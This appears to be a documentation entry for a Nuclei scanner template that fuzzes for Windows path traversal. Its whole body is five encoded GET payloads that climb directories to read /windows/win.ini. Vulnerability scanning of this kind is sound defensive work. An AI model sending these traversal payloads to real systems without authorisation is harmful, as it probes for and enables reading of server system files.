# Nuclei Template: Windows - Local File Inclusion Fuzzing
**Template ID:** windows-lfi-fuzzing
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`windows-lfi-fuzzing.yaml`)

## Vulnerability Information & PoC

## Description
Fuzzing for /windows/win.ini.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini
GET {{BaseURL}}/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/windows/win.ini
GET {{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini
GET {{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
GET {{BaseURL}}/../../../../../../windows/win.ini
```

